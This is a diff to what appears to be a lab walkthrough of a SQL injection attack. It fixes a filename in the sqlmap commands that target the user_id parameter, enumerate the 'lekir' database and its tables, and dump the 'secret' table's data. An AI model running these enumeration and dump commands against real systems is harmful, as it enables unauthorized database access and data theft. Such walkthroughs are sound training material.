@@ -46,7 +46,7 @@ nano post-request.txt
 Run sqlmap as shown below; the option `-r` tells sqlmap to read the `post-request.txt` file to get the information to attack in the POST request. `-p` is the parameter we are attacking. `--dbs` will show the databases that are available. <br>The parameter that we are attacking is `user_id`.<br>
 
 `
-sqlmap -r post-request -p user_id --dbs
+sqlmap -r post-request.txt -p user_id --dbs
 `
 
 ![image 5](./img/image5.png)
@@ -57,7 +57,7 @@ We can see that there is a database named lekir which refers to my target site. 
 <br>
 
 `
-sqlmap -r post-request -p user_id -D lekir --tables
+sqlmap -r post-request.txt -p user_id -D lekir --tables
 `
 
 ![image 7](./img/image7.png)
@@ -65,7 +65,7 @@ sqlmap -r post-request -p user_id -D lekir --tables
 The `secret` table looks suspicious. let's take a look inside it.
 
 `
-sqlmap -r post-request -p user_id -D lekir -T secret --columns
+sqlmap -r post-request.txt -p user_id -D lekir -T secret --columns
 `
 
 ![image 8](./img/image8.png)
@@ -73,7 +73,7 @@ sqlmap -r post-request -p user_id -D lekir -T secret --columns
 Now, we can see that there are two columns in this table which are `secret_id` and `secret_data`. Lets dump the `secret_data` column to see what the data is.<br>
 
 `
-sqlmap -r post-request -p user_id -D lekir -T secret -C secret_data --dump
+sqlmap -r post-request.txt -p user_id -D lekir -T secret -C secret_data --dump
 `
 
 ![image 9](./img/image9.png)
